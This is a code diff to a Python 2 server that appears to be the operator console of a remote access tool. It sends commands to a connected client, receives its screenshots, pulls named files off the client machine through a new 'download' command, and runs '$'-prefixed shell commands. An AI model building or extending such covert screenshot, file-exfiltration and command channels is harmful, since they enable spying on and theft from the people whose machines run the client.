@@ -22,17 +22,24 @@ def setup():
     return server
 
 # recv the client screenshot
-def recvFile(client_socket):
-    if os.path.isfile("recv.jpg"):
-        os.remove("recv.jpg")
-    f = open("recv.jpg","wb") 
+def recvFile(client_socket,type):
+    if (type == "png"):
+        if (os.path.isfile("screenshot.png")):
+            os.remove("screenshot.png")
+        f = open("screenshot.png","wb")
+    else:
+        file = "recvfile%s" % type
+        f = open(file,"wb")
+
     while(1):
         data = client_socket.recv(1024)
-            
-        #print len(data)
+        if (len(data)<8) and (data[:3] == "EOF"):
+            if data[3:5] == "NN":
+                os.remove(file)
+                print "[-] Recv file error!"
+            else:
+                print "[+] Recv file success!"
 
-        if data[:3] == "EOF":
-            print "[+] Recv file success!"
             break
         f.write(data)
     f.close()
@@ -50,13 +57,24 @@ def handle_client(client_socket):
         cmd = raw_input(">>> ")
         client_socket.send(cmd)
         if cmd == "screenshot":
-            recvFile(client_socket)
+            recvFile(client_socket,"png")
+            continue
+
+        elif cmd == "download":
+            cmd = raw_input("File: ")
+            client_socket.send(cmd)
+            recvFile(client_socket,cmd[-4:])
+            continue
+
         elif cmd == "kill-client":
             data = client_socket.recv(1024)
             print "[-] %s" % data
+            break
+
         elif cmd[0] == "$":
             data = client_socket.recv(1024)
             print data.decode('gbk')
+            continue
 
 # this is the help
 def help():
